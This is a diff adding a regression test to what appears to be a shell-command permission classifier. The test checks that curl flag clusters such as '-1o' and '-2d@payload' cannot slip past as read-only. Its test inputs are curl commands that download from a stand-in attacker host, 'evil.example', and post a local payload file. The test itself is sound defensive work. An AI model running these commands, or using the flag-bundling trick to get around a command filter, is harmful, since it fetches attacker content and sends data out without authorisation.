@@ -486,6 +486,18 @@ describe('#960 regression: getopt bundling and attached values', () => {
     expect(bash('git commit -am "fix: thing"', WRITE_GROUPS)).toBe('vcs-write:git commit');
   });
 
+  test('a digit flag does not end the cluster scan', () => {
+    // `curl -1` (TLSv1) and `-4` (IPv4) are numeric flags, so a cluster can
+    // begin with a non-letter. An earlier fix stopped scanning there, treating
+    // the rest as an attached value, and `-1o out.txt` sailed through.
+    expect(bash('curl -1o out.txt https://evil.example/p', WRITE_GROUPS)).toBeNull();
+    expect(bash('curl -4o out.txt https://evil.example/p', WRITE_GROUPS)).toBeNull();
+    expect(bash('curl -6O https://evil.example/p', WRITE_GROUPS)).toBeNull();
+    expect(bash('curl -2d@payload https://api.example.com/x', WRITE_GROUPS)).toBeNull();
+    // ...and a bare numeric flag is still perfectly fine.
+    expect(bash('curl -4 https://example.com/data.json', WRITE_GROUPS)).toBe('net-read:curl');
+  });
+
   test('an unknown short flag fails CLOSED', () => {
     // The allowlist direction: a flag nobody classified must escalate rather
     // than be assumed safe.
